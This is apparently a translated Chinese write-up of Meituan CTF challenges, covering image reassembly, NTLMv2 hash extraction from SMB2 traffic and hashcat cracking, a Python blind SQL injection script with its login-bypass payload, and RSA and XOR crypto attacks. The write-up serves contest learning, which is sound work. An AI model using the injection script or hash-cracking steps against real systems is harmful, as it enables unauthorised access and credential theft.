# 美团CTF
|
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## Misc
###  Different_Puzzle
img直接diskgenius 导出  
这里通过扇区排序。把png排序扫描
直接就能得到flag.txt
    from PIL import Image
    f=open('list.txt')
    str=f.read()
    str=str.split('\n')
    print(str)
    flag=Image.new('RGB',(278,100))
    x,y=(0,0)
    for i in str:
        img=Image.open(i)
        size=img.size
        print(size)
        flag.paste(img,(x,0))
        x=x+size[0]
    flag.show()
###  Find_password
在流量包看到许多smb2协议的包，过滤出来可以看出在不停尝试登录：
在中间有一个包显示登录成功：
然后就参照  来复现  
构造出ntlmv2：
    nanming::MicrosoftAccount:6a99833ddd690e7a:980a5dc38aaff466c367eff70bcf80cb:010100000000000042325524355ed601421cb509516bc2e90000000002001e00570049004e002d004f004d004b004100540046003300520047004a00470001001e00570049004e002d004f004d004b004100540046003300520047004a00470004001e00570049004e002d004f004d004b004100540046003300520047004a00470003001e00570049004e002d004f004d004b004100540046003300520047004a0047000700080042325524355ed6010600040002000000080030003000000000000000010000000020000011ac824d212777625c616fadbb6dd0dfaf35a8e4d93f7960ec1eac5592e7cfde0a001000000000000000000000000000000000000900240063006900660073002f003100390032002e003100360038002e00330031002e00370035000000000000000000
然后用hashcat来爆破，由于文件名为pass%%%%，所以用掩码来爆破：
    ./hashcat -m 5600 -a 3 ntlm.txt pass?a?a?a?a
最后爆出来是pass1952，md5一下就是flag
## Web
###  sql
    import requests as r
    import string
    url = ""
    sql = "binary(password)"
    def str2hex(str):
        ret =""
        for i in range(0, len(str)):
            ret+=hex(ord(str[i]))
        ret = "0x"+ret.replace("0x","")
        return ret
    def blindcmp(start,end):
        ret=""
        for i in range(start,end):
            for ch in string.printable:
                payload=f"||left({sql},{len(ret+ch)})/**/in({str2hex(ret+ch)})#"
                data ={
                    "username":"zbrsb\\",
                    "password":payload
                }
                #print(data)
                req=r.post(url,data=data)
                #print(req.text)
                if (req.status_code != r.codes.ok):
                    continue
                #print req.text
                if "flag" in req.text:
                    ret=ret+ch
                    break
            print(ret)
    blindcmp(1,30)
sql盲注最后登录就行了。
## Crypto
###  RSAsig
0day 签名的时候签(bytes_to_long(base64decode(enc_flag)))即可
###  easy_RSA
首先一个Related Message Attack
    sage: def franklinReiter(n,e,b,c1,c2):
    ....:     R. = Zmod(n)[]
    ....:     f1 = X^e - c1
    ....:     f2 = (X + b)^e - c2
    ....:     m_ = GCD(f1,f2).coefficients()[0] # 返回的是首一多项式，coefficients()
    ....: 返回多项式各项式的系数，项式次数递增，所以第0项是常数
    ....:     return Integer(n - m_) # 由于tmp其实是 -m % n,所以这里给他转换回去。
    ....:
    ....: def GCD(a, b):
    ....:     if(b == 0):
    ....:         return a.monic()^I^I# 返回首一多项式，即多项式最高次的项式系数为1
    ....:     else:
    ....:         return GCD(b, a % b)
    sage:
    sage: n=0x9371c61a2b760109781f229d43c6f05b58de65aa2a674ff92334cb5219132448d72c12
    ....: 93c145eb6f35e58791669f2d8d3b6ce506f4b3543beb947cf119f463a00bd33a33c4d566c4
    ....: fd3f4c73c697fa5f3bf65976284b9cc96ec817241385d480003cdda9649fa0995b013e66f5
    ....: 83c9a9710f7e18396fbf461cb31720f94a0f79
    ....: e=0x3
    ....: #encrypt(m)
    ....: c1=0x5f4e03f28702208b215f39f1c8598b77074bfa238dfb9ce424af7cc8a61f7ea48ffbb
    ....: d5a5e1a10f686c3f240e85d011f6c8b968d1d607b2e1d5a78ad6947b7d3ec8f33ad32489be
    ....: fab601fe745164e4ff4aed7630da89af7f902f6a1bf7266c9c95b29f2c69c33b93a709f282
    ....: d43b10c61b1a1fe76f5fee970780d7512389fd1
    ....: #encrypt(m+1):
    ....: c2=0x5f4e03f28702208b215f39f1c8598b77074bfa238dfb9ce424af7cc8a61f7ea48ffc5
    ....: c26b0c12bcff9f697f274f59f0e55a147768332fc1f1bac5bbc8f9bb508104f232bdd20091
    ....: d26adc52e36feda4a156eae7dce4650f83fabc828fdcfb01d25efb98db8b94811ca855a6aa
    ....: 77caff991e7b986db844ff7a140218449aaa7e8
    sage:
    sage: M = franklinReiter(n,e,1,c1,c2)
    sage: M
    69987496701884177944014408654911578926041003939816261720363083186042632062679566210634401639077276321287225569134
    sage: from Crypto.Util.number import *
    sage: long_to_bytes(699874967018841779440144086549115789260410039398162617203630
    ....: 83186042632062679566210634401639077276321287225569134)
    b'the key is :everything_is_easy_in_this_question'
    sage:
然后是一个many times password
明文应该是英文字母加一点标点符号
与2019De1CTF xorz差不多了。
哦，最后一组和有一次00开头的，不好处理，直接扔掉了，只用十组。加密密钥就是flag，最后根据意思猜一猜就好了。
    import string
    def xor(a,b):
        return chr(ord(a)^ord(b))
    #000a090f001e491d2c111d3024601405431a36231b083e022c1d,
    c='''
    280316470206017f5f163a3460100b111b2c254e103715600f13,
    091b0f471d05153811122c70340c0111053a394e0b39500f0a18,
    4638080a1e49243e55531a3e23161d411a362e4044111f374409,
    0e0d15470206017f59122935601405421d3a244e10371560140f,
    031a08080e1a540d62327f242517101d4e2b2807177f13280511,
    16000406080c543854077f24280144451c2a254e093a0333051a,
    02050701120a01334553393f32441d5e1b716027107f19334417,
    131f15470800192f5d167f352e0716481e2b29010a7139600c12,
    1609411e141c543c501d7f232f0812544e2b2807177f00320b1f,
    0a090c470a1c1d3c5a1f2670210a0011093a344e103715600712'''.replace("\n","").split(",")
    s = []
    for i in c:
        s.append(i.decode('hex'))
    key=""
    table = string.lowercase+string.uppercase+" ,."
    for i in range(len(s[0])):
        for k in range(126):
            check=0
            for j in range(len(s)):
                tmp = xor(chr(k),s[j][i])
                if tmp in table:
                    check+=1
            if check == 10:
                print(chr(k))
            else:
                #print check
                pass
        print "="*50
    '''
    f
    ==================================================
    H
    J
    K
    L
    N
    O
    h
    j
    k
    l
    n
    o
    ==================================================
    a
    ==================================================
    g
    i
    k
    ==================================================
    D
    G
    X
    Z
    [
    d
    g
    x
    z
    {
    ==================================================
    i
    ==================================================
    t
    ==================================================
    _
    ==================================================
    1
    ==================================================
    s
    ==================================================
    _
    ==================================================
    P
    ==================================================
    @
    ==================================================
    d
    ==================================================
    d
    ==================================================
    1
    ==================================================
    n
    ==================================================
    ]
    _
    ==================================================
    @
    L
    ==================================================
    `
    n
    ==================================================
    d
    ==================================================
    _
    ==================================================
    p
    ==================================================